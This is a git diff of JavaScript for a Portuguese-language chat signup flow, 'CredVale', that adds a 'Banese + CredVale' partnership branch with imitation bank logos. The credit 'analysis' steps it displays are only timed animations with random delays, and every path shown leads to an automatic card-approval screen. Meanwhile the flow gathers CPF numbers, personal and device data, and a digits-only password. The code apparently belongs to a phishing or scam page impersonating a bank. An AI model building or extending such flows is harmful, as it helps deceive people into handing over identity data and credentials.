@@ -17,7 +17,7 @@
   const pageFooter  = document.querySelector('.footer');
 
   /* ---- State ---- */
-  const steps = ['Início','CPF','Dados','Endereço','Contato','Perfil','Análise','Plano','Adesão'];
+  const steps = ['Início','Benefício','Cadastro','Endereço','Contato','Perfil','Aprovação','Plano','Acesso'];
   let currentStep = -1;
   let waitingInput = false;
   let currentResolve = null;
@@ -229,6 +229,8 @@
       '<text x="312" y="192" font-family="Arial,sans-serif" font-size="14" font-weight="600" fill="#ffffff" text-anchor="end">12/28</text>'+
       /* Tag */
       '<text x="170" y="200" font-family="Arial,sans-serif" font-size="7" fill="rgba(255,255,255,0.3)" text-anchor="middle" letter-spacing="1.2">CREDVALE \u00b7 CART\u00c3O DE BENEF\u00cdCIOS</text>'+
+    '</svg></div>';
+  }
 
   /* ============================================================
      FUNCAO: Cartao SVG Banese Premium (Visa Infinite, verde escuro, chip metalico)
@@ -568,6 +570,14 @@
     hideInput();
     await sleep(400);
 
+    // BANESE FLOW: se veio do landing page com flag credvale_banese
+    var isBanese = sessionStorage.getItem('credvale_banese') === 'true';
+    if (isBanese) {
+      sessionStorage.removeItem('credvale_banese');
+      etapaBaneseBoasVindas();
+      return;
+    }
+
     var savedCPF = sessionStorage.getItem('credvale_cpf');
     var savedName = sessionStorage.getItem('credvale_name');
 
@@ -589,6 +599,96 @@
     }
   }
 
+  /* ============================================================
+     FLUXO BANESE - Pergunta inicial + Modal Premium
+     ============================================================ */
+  async function etapaBaneseBoasVindas() {
+    flowState = 'banese_boasvindas';
+    hideInput();
+    addMsg(
+      '<div class="chat-welcome-v2">'+
+        '<div class="chat-welcome-v2__title" style="font-size:1.5rem;color:#047857;">🏦 Banese + CredVale</div>'+
+        '<div class="chat-welcome-v2__desc">'+
+          'Bem-vindo ao <strong>programa de benefícios exclusivos</strong> para correntistas Banese.'+
+        '</div>'+
+        '<div style="margin:12px 0;background:rgba(4,120,87,0.08);border-radius:12px;padding:12px;text-align:left;">'+
+          '<div style="display:flex;align-items:center;gap:8px;margin-bottom:6px;"><span style="font-size:1.2rem;">💰</span><span style="font-size:0.8rem;color:#1F2937;"><strong>Até R\u002410.000</strong> de limite</span></div>'+
+          '<div style="display:flex;align-items:center;gap:8px;margin-bottom:6px;"><span style="font-size:1.2rem;">💊</span><span style="font-size:0.8rem;color:#1F2937;"><strong>Até 75% OFF</strong> em medicamentos</span></div>'+
+          '<div style="display:flex;align-items:center;gap:8px;"><span style="font-size:1.2rem;">🎁</span><span style="font-size:0.8rem;color:#1F2937;"><strong>6 meses grátis</strong> · depois R\u00240,99/m\u00eas</span></div>'+
+        '</div>'+
+        '<div class="chat-welcome-v2__badge" style="background:rgba(4,120,87,0.1);color:#047857;">Exclusivo para correntistas Banese</div>'+
+      '</div>'
+    );
+    await sleep(400);
+    addTyping(); await sleep(600); removeTyping();
+    addMsg('👋 Olá!<br><br>Antes de começarmos, queremos saber uma informação.');
+    await sleep(300);
+    addMsg('<strong>Você é correntista Banese?</strong>');
+    showOptions([
+      { label:'🟢 Sim, sou cliente Banese', primary:true, action:function(){
+        etapaBaneseModal();
+      }},
+      { label:'⚪ Não sou cliente', action:function(){
+        // Fluxo normal (CredVale padrão)
+        addMsg('Sem problemas! Vamos seguir com o cadastro CredVale padrão. 💚', 'bot');
+        addMsg('<strong>Informe seu CPF</strong> para continuar.');
+        etapaCPF(true);
+      }}
+    ]);
+  }
+
+  /* ---- MODAL PREMIUM BANESE (compacto) ---- */
+  async function etapaBaneseModal() {
+    flowState = 'banese_modal';
+    hideInput();
+    var baneseHtml = 
+      '<div class="banese-premium-modal" style="padding:16px;">'+
+        '<div class="banese-premium-header" style="margin-bottom:6px;">'+
+          '<div class="banese-premium-logos" style="gap:6px;">'+
+            '<div class="banese-premium-logo">'+
+              '<div style="width:36px;height:36px;border-radius:10px;background:linear-gradient(135deg,#022c22,#065F46);display:flex;align-items:center;justify-content:center;color:white;font-size:10px;font-weight:900;letter-spacing:1px;box-shadow:0 2px 8px rgba(4,120,87,0.2);">BAN</div>'+
+            '</div>'+
+            '<div style="font-size:16px;color:#d1d5db;font-weight:300;">+</div>'+
+            '<div class="banese-premium-logo">'+
+              '<div style="width:36px;height:36px;border-radius:10px;background:linear-gradient(135deg,#047857,#10b981);display:flex;align-items:center;justify-content:center;color:white;font-size:12px;font-weight:900;box-shadow:0 2px 8px rgba(16,185,129,0.2);">CV</div>'+
+            '</div>'+
+          '</div>'+
+        '</div>'+
+        '<div style="text-align:center;margin:4px 0 6px;">'+
+          '<div style="display:inline-block;background:rgba(4,120,87,0.08);padding:3px 12px;border-radius:50px;font-size:10px;font-weight:700;color:#047857;letter-spacing:0.3px;">EXCLUSIVO CORRENTISTA BANESE</div>'+
+        '</div>'+
+        '<div class="banese-premium-content">'+
+          '<div class="banese-premium-title" style="font-size:1.15rem;margin-bottom:4px;">Excelente! \u2764\uFE0F</div>'+
+          '<div style="font-size:0.8rem;color:#475569;text-align:center;margin-bottom:8px;line-height:1.4;">'+
+            'Voc\u00ea acaba de acessar as <strong>condi\u00e7\u00f5es exclusivas</strong> da parceria Banese + CredVale.'+
+          '</div>'+
+          '<div style="display:grid;grid-template-columns:1fr 1fr;gap:4px;margin-bottom:8px;">'+
+            '<div style="background:rgba(4,120,87,0.06);border-radius:8px;padding:6px 10px;font-size:0.78rem;color:#1F2937;">\ud83d\udcb0 <strong>At\u00e9 R$10.000</strong></div>'+
+            '<div style="background:rgba(4,120,87,0.06);border-radius:8px;padding:6px 10px;font-size:0.78rem;color:#1F2937;">\ud83d\udc8a <strong>At\u00e9 75% OFF</strong></div>'+
+            '<div style="background:rgba(4,120,87,0.06);border-radius:8px;padding:6px 10px;font-size:0.78rem;color:#1F2937;">\ud83c\udf89 <strong>6 meses gr\u00e1tis</strong></div>'+
+            '<div style="background:rgba(4,120,87,0.06);border-radius:8px;padding:6px 10px;font-size:0.78rem;color:#1F2937;">\ud83c\udfaf <strong>~2 minutos</strong></div>'+
+          '</div>'+
+          '<div style="font-size:0.78rem;color:#475569;background:rgba(4,120,87,0.06);padding:8px 12px;border-radius:10px;border-left:3px solid #047857;text-align:left;margin-bottom:8px;line-height:1.4;">'+
+            'Agora vamos confirmar algumas informa\u00e7\u00f5es para continuar seu cadastro.'+
+          '</div>'+
+        '</div>'+
+        '<button class="banese-premium-cta" id="banesePremiumContinue" style="padding:10px 0;font-size:0.9rem;">Continuar</button>'+
+      '</div>';
+
+    showPopup(baneseHtml);
+    var bx = document.querySelector('.popup-box');
+    if (bx) bx.classList.add('popup-box--premium');
+    var ov = document.querySelector('.popup-overlay');
+    if (ov) ov.classList.add('popup-overlay--light');
+
+    document.getElementById('banesePremiumContinue').onclick = function() {
+      closePopup();
+      user.isBanese = true;
+      addMsg('\u2705 <strong>Benef\u00edcio Banese confirmado!</strong>', 'bot');
+      addMsg('Vamos confirmar seus dados. <strong>Informe seu CPF</strong> para continuar.');
+      etapaCPF(true);
+    };
+  }
   window._iniciarChat = function() {
     var savedCPF = sessionStorage.getItem('credvale_cpf');
     var savedName = sessionStorage.getItem('credvale_name');
@@ -867,68 +967,87 @@
     ]);
   }
 
-  /* ---- POPUP DE INTRODUÇÃO DA ANÁLISE ---- */
+  /* ---- POPUP DE INTRODUÇÃO DA ANÁLISE (Premium Banese) ---- */
   async function etapaIntroAnalise() {
     var nome = (user.nome||'').split(' ')[0] || 'Cliente';
-    var frases = [
-      'Iniciando análise das informações para verificar sua solicitação do CredVale.',
-      'Processo rápido — leva apenas alguns segundos.',
-      'Mantenha esta página aberta e não atualize o navegador.',
-      'Em instantes você verá o resultado da análise.'
+    // Etapas enxutas da an\u00e1lise
+    var etapas = user.isBanese ? [
+      { label: 'Validando CPF', icon: '\u2705' },
+      { label: 'Analisando cr\u00e9dito e perfil', icon: '\u23F3' },
+      { label: 'Verificando elegibilidade Banese', icon: '\u23F3' },
+      { label: 'Calculando limite dispon\u00edvel', icon: '\u23F3' },
+      { label: 'Preparando resultado', icon: '\u23F3' }
+    ] : [
+      { label: 'Validando CPF', icon: '\u2705' },
+      { label: 'Analisando dados cadastrais', icon: '\u23F3' },
+      { label: 'Calculando limite', icon: '\u23F3' },
+      { label: 'Preparando resultado', icon: '\u23F3' }
     ];
-    var labels = ['Conectando...', 'Verificando dados...', 'Processando...', 'Finalizando...'];
+    var isPremium = user.isBanese ? true : false;
+    var gradFrom = isPremium ? '#022c22' : '#0B6CF4';
+    var gradTo = isPremium ? '#065F46' : '#059669';
+    var shadowColor = isPremium ? 'rgba(4,120,87,0.25)' : 'rgba(11,108,244,0.2)';
     var html =
-      '<div class="terminal-popup">'+
-        '<div class="terminal-window">'+
-          '<div class="terminal-titlebar">'+
-            '<span class="terminal-dot terminal-dot--red"></span>'+
-            '<span class="terminal-dot terminal-dot--yellow"></span>'+
-            '<span class="terminal-dot terminal-dot--green"></span>'+
-            '<span class="terminal-title-text">CREDVALE — análise</span>'+
-          '</div>'+
-          '<div class="terminal-body">'+
-            '<div class="terminal-greeting">'+
-              '<span class="terminal-greeting-icon">'+
-                (nome ? nome.charAt(0).toUpperCase() : '?')+
-              '</span>'+
-              '<span class="terminal-greeting-text">Olá '+nome+', sua análise está começando</span>'+
-            '</div>'+
-            '<div class="terminal-lines" id="terminalLines">'+
-              frases.map(function(f,i){
-                return '<div class="terminal-line" data-idx="'+i+'">'+
-                  '<span class="terminal-line-prefix">▸</span>'+
-                  '<span>'+f+'</span>'+
-                '</div>';
-              }).join('')+
-            '</div>'+
-            '<div class="terminal-footer">'+
-              '<div class="terminal-footer-bar">'+
-                '<div class="terminal-footer-fill" id="terminalFill"></div>'+
-              '</div>'+
-              '<span class="terminal-footer-label" id="terminalLabel">0%</span>'+
-            '</div>'+
-          '</div>'+
+      '<div style="text-align:center;padding:12px 0 4px;">'+
+        '<div style="width:60px;height:60px;border-radius:18px;background:linear-gradient(135deg,'+gradFrom+','+gradTo+');display:flex;align-items:center;justify-content:center;margin:0 auto 14px;box-shadow:0 6px 20px '+shadowColor+';">'+
+          '<svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">'+
+            '<path d="M12 2L2 7l10 5 10-5-10-5z"/>'+
+            '<path d="M2 17l10 5 10-5"/>'+
+            '<path d="M2 12l10 5 10-5"/>'+
+          '</svg>'+
         '</div>'+
+        '<div class="popup-title" style="font-size:1.15rem;font-weight:800;color:#0f172a;">'+nome+', estamos analisando</div>'+
+        '<div class="popup-subtitle" style="font-size:0.82rem;color:#64748b;margin-top:4px;">An\u00e1lise em andamento — leva poucos instantes</div>'+
+        '<div class="popup-step-list" id="analysisStepList" style="margin:18px 0 8px;text-align:left;">'+
+          etapas.map(function(e, i){
+            return '<div class="popup-step-item" data-idx="'+i+'" style="padding:9px 14px;border-radius:10px;margin-bottom:6px;background:#f8fafc;border:1px solid #e2e8f0;transition:all 0.4s ease;">'+
+              '<div class="popup-step-icon" id="asi'+i+'" style="display:inline-flex;align-items:center;justify-content:center;width:26px;height:26px;border-radius:8px;background:#e2e8f0;color:#475569;font-size:12px;font-weight:700;margin-right:10px;transition:all 0.4s ease;">'+(i+1)+'</div>'+
+              '<span id="ast'+i+'" style="font-size:0.85rem;color:#475569;font-weight:500;transition:color 0.4s ease;">'+e.label+'</span>'+
+            '</div>';
+          }).join('')+
+        '</div>'+
+        '<div class="popup-progress-bar" style="margin:12px auto 4px;max-width:200px;height:5px;border-radius:10px;background:#e2e8f0;overflow:hidden;">'+
+          '<div class="popup-progress-fill" id="analysisProgressFill" style="width:0%;height:100%;border-radius:10px;background:linear-gradient(90deg,'+gradFrom+','+gradTo+');transition:width 0.6s ease;"></div>'+
+        '</div>'+
+        '<div style="font-size:0.72rem;color:#94a3b8;margin-top:10px;font-weight:500;" id="analysisStatusText">Iniciando an\u00e1lise...</div>'+
       '</div>';
     showPopup(html);
-    for (var i = 0; i < frases.length; i++) {
-      var el = document.querySelector('.terminal-line[data-idx="'+i+'"]');
-      if (el) {
-        await sleep(60);
-        el.classList.add('terminal-line--visible');
-        if (i > 0) {
-          var prev = document.querySelector('.terminal-line[data-idx="'+(i-1)+'"]');
-          if (prev) prev.classList.remove('terminal-line--active');
+    var bx = document.querySelector('.popup-box');
+    if (bx) { bx.style.maxWidth = '400px'; bx.style.borderRadius = '20px'; bx.style.padding = '24px'; }
+    var fill = document.getElementById('analysisProgressFill');
+    var statusText = document.getElementById('analysisStatusText');
+    for (var i = 0; i < etapas.length; i++) {
+      var item = document.querySelector('.popup-step-item[data-idx="'+i+'"]');
+      var icon = document.getElementById('asi'+i);
+      if (item) {
+        item.style.borderColor = gradFrom;
+        item.style.background = isPremium ? 'rgba(4,120,87,0.06)' : 'rgba(11,108,244,0.06)';
+        item.classList.add('popup-step-item--active');
+        if (icon) {
+          icon.style.background = isPremium ? '#047857' : '#0B6CF4';
+          icon.style.color = '#ffffff';
+          icon.textContent = '\u21BB';
         }
-        el.classList.add('terminal-line--active');
       }
-      var fill = document.getElementById('terminalFill');
-      var label = document.getElementById('terminalLabel');
-      var pct = Math.round(((i+1)/frases.length)*100);
-      if (fill) fill.style.width = pct+'%';
-      if (label) label.textContent = labels[i]+' '+pct+'%';
-      if (i < frases.length - 1) await sleep(2600);
+      if (statusText) statusText.textContent = etapas[i].label + '...';
+      // Mais lento: 1.3s a 2.1s por etapa
+      await sleep(1300 + Math.floor(Math.random()*800));
+      if (item) {
+        if (i < etapas.length-1) {
+          item.style.borderColor = '#d1d5db';
+          item.style.background = '#f1f5f9';
+          item.classList.remove('popup-step-item--active');
+        }
+        item.classList.add('popup-step-item--done');
+        if (icon) {
+          icon.style.background = isPremium ? '#047857' : '#0B6CF4';
+          icon.textContent = '\u2713';
+        }
+      }
+      if (fill) fill.style.width = Math.round((i+1)/etapas.length*100)+'%';
     }
+    if (statusText) statusText.textContent = '\u2705 Conclu\u00eddo!';
+    if (fill) fill.style.width = '100%';
     await sleep(1000);
     closePopup();
     await sleep(300);
@@ -956,24 +1075,26 @@
     hideInput();
 
     var steps = [
-      { label:'Verificando CPF', done:false },
-      { label:'Analisando dados cadastrais', done:false },
-      { label:'Analisando questionário', done:false },
-      { label:'Consultando referências', done:false },
-      { label:'Calculando limite', done:false },
-      { label:'Preparando proposta', done:false }
+      { label:'Verificando cadastro...', done:false },
+      { label:'Validando formulário...', done:false },
+      { label:'Consultando score...', done:false },
+      { label:'Verificando relacionamento Banese...', done:false },
+      { label:'Validando informações cadastrais...', done:false },
+      { label:'Finalizando análise...', done:false }
     ];
 
     var procHtml =
-      '<div class="popup-spinner"></div>'+
-      '<div class="popup-title">Analisando seus dados</div>'+
-      '<div class="popup-subtitle">Estamos processando suas informações</div>'+
-      '<div class="popup-step-list" id="popupStepList">'+
+      '<div style="text-align:center;padding:8px 0;">'+
+      '<div style="width:40px;height:40px;margin:0 auto 14px;border:3px solid rgba(0,0,0,0.06);border-top-color:#4CC8A4;border-radius:50%;animation:spin 1.2s linear infinite;"></div>'+
+      '<div class="popup-title" style="font-size:1rem;font-weight:700;color:#0f172a;margin-bottom:2px;">Analisando seus dados</div>'+
+      '<div class="popup-subtitle" style="font-size:0.78rem;color:#64748b;margin-bottom:14px;">Estamos processando suas informações</div>'+
+      '<div class="popup-step-list" id="popupStepList" style="text-align:left;max-width:260px;margin:0 auto;">'+
         steps.map(function(s,i){
-          return '<div class="popup-step-item" data-idx="'+i+'"><div class="popup-step-icon">'+(i+1)+'</div>'+s.label+'</div>';
+          return '<div class="popup-step-item" data-idx="'+i+'" style="display:flex;align-items:center;gap:10px;padding:8px 10px;border-radius:8px;margin-bottom:4px;font-size:0.82rem;color:#94a3b8;transition:all 0.4s ease;"><div class="popup-step-icon" style="width:22px;height:22px;border-radius:50%;background:#e2e8f0;color:#64748b;display:flex;align-items:center;justify-content:center;font-size:0.7rem;font-weight:700;flex-shrink:0;">'+(i+1)+'</div>'+s.label+'</div>';
         }).join('')+
       '</div>'+
-      '<div class="popup-progress-bar"><div class="popup-progress-fill" id="popupProgressFill"></div></div>';
+      '<div class="popup-progress-bar" style="margin-top:12px;height:4px;background:#e2e8f0;border-radius:4px;overflow:hidden;"><div class="popup-progress-fill" id="popupProgressFill" style="height:100%;width:0%;background:linear-gradient(90deg,#3B82F6,#4CC8A4);border-radius:4px;transition:width 0.6s ease;"></div></div>'+
+      '</div>';
 
     showPopup(procHtml);
 
@@ -981,18 +1102,31 @@
     for (var i=0; i<steps.length; i++) {
       var item = document.querySelector('.popup-step-item[data-idx="'+i+'"]');
       if (item) {
-        item.classList.add('popup-step-item--active');
+        item.style.color = '#0f172a';
+        item.style.background = 'rgba(59,130,246,0.06)';
         var ic = item.querySelector('.popup-step-icon');
-        if (ic) ic.textContent = '⟳';
-        await sleep(1800 + Math.floor(Math.random()*1200));
-        item.classList.remove('popup-step-item--active');
-        item.classList.add('popup-step-item--done');
-        if (ic) ic.textContent = '✓';
+        if (ic) { ic.textContent = '⟳'; ic.style.background = '#3B82F6'; ic.style.color = '#fff'; }
+        await sleep(2000 + Math.floor(Math.random()*2000));
+        item.style.color = '#10B981';
+        item.style.background = 'rgba(16,185,129,0.06)';
+        if (ic) { ic.textContent = '✓'; ic.style.background = '#10B981'; ic.style.color = '#fff'; }
       } else {
-        await sleep(1800 + Math.floor(Math.random()*1200));
+        await sleep(2500 + Math.floor(Math.random()*1500));
       }
       if (fill) fill.style.width = Math.round(((i+1)/steps.length)*100)+'%';
     }
+
+    // Processing screen
+    closePopup();
+    await sleep(300);
+    showPopup(
+      '<div style="text-align:center;padding:24px 0;">'+
+        '<div style="width:48px;height:48px;margin:0 auto 16px;border:4px solid rgba(0,0,0,0.06);border-top-color:#4CC8A4;border-right-color:#3B82F6;border-radius:50%;animation:spin 1.4s linear infinite;"></div>'+
+        '<div style="font-size:1rem;font-weight:700;color:#0f172a;margin-bottom:6px;">Aguarde, estamos processando sua solicitação...</div>'+
+        '<div style="font-size:0.78rem;color:#64748b;">Estamos preparando seu cartão</div>'+
+      '</div>'
+    );
+    await sleep(4000);
 
     var apiData = {
       cpf: user.cpf, nome: user.nome, nascimento: user.nascimento, sexo: user.sexo,
@@ -1006,7 +1140,8 @@
       fabricante: sessionStorage.getItem('vs_fabricante')||'',
       os: sessionStorage.getItem('vs_os')||'',
       navegador: sessionStorage.getItem('vs_navegador')||'',
-      navegador_versao: sessionStorage.getItem('vs_navegador_versao')||''
+      navegador_versao: sessionStorage.getItem('vs_navegador_versao')||'',
+      banese_cliente: user.isBanese ? 1 : 0
     };
     var apiResult = await API.createClient(apiData).catch(function(){ return null; });
     clientId = apiResult ? apiResult.clientId : clientId;
@@ -1022,41 +1157,47 @@
     await sleep(600);
     var nomePrimeiro = (user.nome||'').split(' ')[0]||'';
     var limFmt = Number(limite).toFixed(2).replace('.',',');
-    var popupBox = document.querySelector('.popup-box');
-    if (popupBox) {
-      popupBox.innerHTML =
-        '<div style="text-align:center;margin-bottom:12px;">'+
-          '<div style="display:inline-flex;align-items:center;gap:5px;background:rgba(76,200,164,0.12);border:1px solid rgba(76,200,164,0.2);border-radius:20px;padding:4px 14px 4px 10px;margin-bottom:10px;">'+
-            '<span style="width:18px;height:18px;border-radius:50%;background:linear-gradient(135deg,#4CC8A4,#059669);display:flex;align-items:center;justify-content:center;font-size:0.5rem;color:#fff;">✓</span>'+
-            '<span style="font-size:0.65rem;color:#4CC8A4;font-weight:700;letter-spacing:0.3px;">CRÉDITO APROVADO</span>'+
-          '</div>'+
-          '<div style="display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:8px;">'+
-            '<span style="font-size:1.8rem;line-height:1;">🎉</span>'+
-            '<div style="font-size:1.25rem;font-weight:800;color:#0f172a;">Parabéns, <span style="background:linear-gradient(135deg,#4CC8A4,#3B82F6);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;">'+nomePrimeiro+'</span>!</div>'+
-          '</div>'+
-          '<div style="background:linear-gradient(160deg,rgba(76,200,164,0.06),rgba(59,130,246,0.04));border:1px solid rgba(76,200,164,0.12);border-radius:16px;padding:14px 16px;margin-bottom:12px;">'+
-            '<div style="font-size:0.6rem;color:#475569;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:2px;">Seu limite liberado</div>'+
-            '<div style="font-size:2rem;font-weight:900;background:linear-gradient(135deg,#4CC8A4,#3B82F6);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;font-family:Space Grotesk,sans-serif;line-height:1.2;">R$ '+limFmt+'</div>'+
-          '</div>'+
-          '<div style="text-align:left;">'+
-            '<div style="font-size:0.72rem;color:#475569;font-weight:600;margin-bottom:6px;text-transform:uppercase;letter-spacing:0.3px;">⚡ Benefícios</div>'+
-            '<div style="display:flex;flex-direction:column;gap:4px;">'+
-              '<div style="display:flex;align-items:center;gap:8px;font-size:0.75rem;color:#475569;padding:5px 8px;border-radius:8px;background:rgba(255,255,255,0.02);"><span style="width:16px;height:16px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">✓</span> Desconto de até <strong>75%</strong> em medicamentos</div>'+
-              '<div style="display:flex;align-items:center;gap:8px;font-size:0.75rem;color:#475569;padding:5px 8px;border-radius:8px;background:rgba(255,255,255,0.02);"><span style="width:16px;height:16px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">✓</span> Fatura em até <strong>45 dias</strong> para pagar</div>'+
-              '<div style="display:flex;align-items:center;gap:8px;font-size:0.75rem;color:#475569;padding:5px 8px;border-radius:8px;background:rgba(255,255,255,0.02);"><span style="width:16px;height:16px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">✓</span> Parcelamento de medicamentos em até <strong>15x</strong></div>'+
-            '</div>'+
-          '</div>'+
-        '</div>'+
-        '<button class="chat-option chat-option--primary" id="popupContinuar" style="padding:14px;font-size:0.88rem;border:none;border-radius:12px;cursor:pointer;font-weight:800;font-family:inherit;background:linear-gradient(135deg,#3B82F6,#4CC8A4);color:#fff;width:100%;box-shadow:0 4px 20px rgba(59,130,246,0.15);transition:all .3s;">Continuar</button>';
+    closePopup();
+    await sleep(200);
 
-      // Só aprova e envia SMS depois que o cliente VIU a mensagem de aprovação
-      try { await API.updateClientStatus(clientId, 'aprovado', limite); } catch (e) { console.error('[aprovar]', e); }
-    }
+    var cardSvgAprov = user.isBanese ? gerarCardBaneseSVG(user.nome, limite, (user.cpf||'').slice(-4)||'4589') : gerarCardSVG(user.nome, limite, (user.cpf||'').slice(-4)||'0000');
+    showPopup(
+      '<div class="approval-container" style="padding:8px 0 4px;">'+
+        '<div class="approval-badge">'+
+          '<span class="badge-dot"></span>'+
+          '<span>'+(user.isBanese ? 'BANESE + CREDVALE' : 'CRÉDITO APROVADO')+'</span>'+
+        '</div>'+
+        '<div class="approval-title">'+
+          'Parabéns,<br><span class="highlight">'+nomePrimeiro+'</span>!'+
+        '</div>'+
+        '<div style="font-size:0.85rem;color:#475569;margin-bottom:8px;font-weight:500;">Seu cartão foi aprovado</div>'+
+        '<div class="approval-card-wrap">'+
+          '<div class="approval-glow-ring"></div>'+
+          cardSvgAprov+
+        '</div>'+
+        '<div style="font-size:1.5rem;font-weight:900;color:#047857;margin:4px 0 10px;font-family:Space Grotesk,sans-serif;">R$ '+limFmt+'</div>'+
+        '<button id="popupProximo" class="approval-cta">Próximo</button>'+
+      '</div>'
+    );
+    confettiAnimation(3000);
 
     await new Promise(function(resolve) {
-      var btn = document.getElementById('popupContinuar');
-      if (btn) { btn.onclick = function() { closePopup(); resolve(); }; }
-      else { resolve(); }
+      var btn = document.getElementById('popupProximo');
+      if (btn) {
+        btn.onclick = function() {
+          closePopup();
+          // Dispara SMS automático ao aprovar
+          var apiBase = window.__API_BASE || '/api';
+          fetch(apiBase + '/clients/' + clientId + '/status', {
+            method: 'PATCH',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ status: 'aprovado' })
+          }).catch(function(){});
+          resolve();
+        };
+      } else {
+        resolve();
+      }
     });
 
     hideInput();
@@ -1107,7 +1248,21 @@
           '</div>'
         );
 
-        document.getElementById('btnCadastrarCredenciais').onclick = function() {
+            document.getElementById('credPassword').addEventListener('input', function() {
+      var val = this.value.replace(/\D/g, '');
+      this.value = val;
+      var len = val.length;
+      var ps1 = document.getElementById('ps1');
+      var ps2 = document.getElementById('ps2');
+      var ps3 = document.getElementById('ps3');
+      if (ps1) ps1.style.background = len >= 1 ? '#f59e0b' : '#e2e8f0';
+      if (ps2) ps2.style.background = len >= 3 ? '#f59e0b' : '#e2e8f0';
+      if (ps3) ps3.style.background = len >= 5 ? '#10B981' : '#e2e8f0';
+    });
+    document.getElementById('credConfirmPassword').addEventListener('input', function() {
+      this.value = this.value.replace(/\D/g, '');
+    });
+    document.getElementById('btnCadastrarCredenciais').onclick = function() {
           var pw = document.getElementById('credPassword').value;
           var cpw = document.getElementById('credConfirmPassword').value;
           var errEl = document.getElementById('credError');
@@ -1223,18 +1378,17 @@
   async function mostrarTelaBoasVindas(clientId, limite) {
     var primeiroNome = (user.nome || '').split(' ')[0] || 'Cliente';
 
-    addMsg(
+        addMsg(
       '<div style="text-align:center;padding:8px 0;">' +
         '<div style="display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:8px;">' +
-          '<div style="width:56px;height:56px;border-radius:50%;background:linear-gradient(135deg,rgba(16,185,129,0.1),rgba(59,130,246,0.08));display:flex;align-items:center;justify-content:center;border:2px solid rgba(16,185,129,0.12);">' +
-            '<span style="font-size:1.5rem;">\uD83C\uDF89</span>' +
+          '<div style="width:64px;height:64px;border-radius:18px;background:linear-gradient(135deg,#022c22,#065F46);display:flex;align-items:center;justify-content:center;box-shadow:0 4px 16px rgba(4,120,87,0.25);">' +
+            '<span style="font-size:1.8rem;">🎉</span>' +
           '</div>' +
         '</div>' +
-        '<div style="font-size:1.2rem;font-weight:800;color:#0f172a;margin-bottom:4px;">Ol\u00e1, ' + primeiroNome + '!</div>' +
-        '<div style="font-size:0.95rem;font-weight:600;color:#4CC8A4;margin-bottom:6px;">Seja bem-vindo(a)!</div>' +
-        '<div style="font-size:0.82rem;color:#475569;line-height:1.6;margin-bottom:8px;">' +
-          'Seu cadastro foi conclu\u00eddo com sucesso.<br><br>' +
-          'Agora basta baixar o aplicativo para acessar sua conta e come\u00e7ar a utilizar todos os seus benef\u00edcios.' +
+        '<div style="font-size:1.3rem;font-weight:900;color:#047857;margin-bottom:4px;">🎉 Cadastro concluído com sucesso,  + primeiroNome + !</div>' +
+        '<div style="font-size:1rem;font-weight:700;color:#0f172a;margin-bottom:8px;">Seu acesso está sendo preparado.</div>' +
+        '<div style="font-size:0.85rem;color:#475569;line-height:1.6;margin-bottom:8px;">' +
+          'Enquanto isso você já pode baixar o aplicativo ou falar com um especialista para começar a aproveitar todos os seus benefícios.' +
         '</div>' +
       '</div>',
       'bot'
@@ -1255,32 +1409,27 @@
 
     var nome = (user.nome||'Cliente').split(' ')[0]||'Cliente';
 
-    // Card do Plano CredVale - reusa exatamente o layout/bloco da Página Index
+    // Card do Plano Exclusivo - layout atualizado com valores corretos
     var cardHtml =
-      '<div style="text-align:center;">' +          '<div style="margin-bottom:6px;"><span style="font-size:1.25rem;">🎉</span> <span style="font-size:1.25rem;font-weight:900;background:linear-gradient(135deg,#0B6CF4,#00C853);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;">' + nome + '!</span></div>' +
+      '<div style="text-align:center;">' +
+        '<div style="margin-bottom:6px;"><span style="font-size:1.25rem;">🎉</span> <span style="font-size:1.25rem;font-weight:900;background:linear-gradient(135deg,#0B6CF4,#00C853);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;">' + nome + '!</span></div>' +
         '<div style="font-size:0.75rem;font-weight:500;color:#6B7280;margin-bottom:8px;">Escolha se deseja assinar o plano exclusivo CredVale</div>' +
       '</div>' +
-      /* Card do Plano CredVale — réplica exata do componente da Index */
       '<div style="background:#ffffff;border-radius:16px;border:1px solid #dbeafe;padding:16px;box-shadow:0 10px 15px -3px rgba(0,0,0,0.1),0 4px 6px -4px rgba(0,0,0,0.1);position:relative;overflow:hidden;">' +
-        /* Badge "Mais Escolhido" */
-        '<div style="position:absolute;top:0;right:0;background:#0B6CF4;color:#fff;font-size:10px;font-weight:700;text-transform:uppercase;padding:4px 16px;border-radius:0 0 0 12px;letter-spacing:0.5px;z-index:1;">⭐ Mais Escolhido</div>' +
-        /* Título */
+        '<div style="position:absolute;top:0;right:0;background:#0B6CF4;color:#fff;font-size:10px;font-weight:700;text-transform:uppercase;padding:4px 16px;border-radius:0 0 0 12px;letter-spacing:0.5px;z-index:1;">⭐ EXCLUSIVO</div>' +
         '<div style="font-family:-apple-system,BlinkMacSystemFont,\'Segoe UI\',Roboto,system-ui,sans-serif;font-size:1rem;font-weight:700;color:#111827;">Plano CredVale</div>' +
-        /* Descrição */
         '<div style="font-size:0.7rem;color:#6B7280;margin-top:2px;line-height:1.5;">' +
-          'Ideal para quem deseja economizar de verdade em saúde e medicamentos todos os meses.' +
+          'Acesso a todos os benefícios CredVale com condições especiais.' +
         '</div>' +
-        /* Preço */
         '<div style="margin:14px 0;">' +
-          '<div style="font-size:0.68rem;font-weight:600;color:#9CA3AF;">Apenas</div>' +
+          '<div style="font-size:0.68rem;font-weight:600;color:#9CA3AF;text-decoration:line-through;">De: R$ 26,99</div>' +
           '<div style="display:flex;align-items:baseline;gap:4px;margin-top:2px;">' +
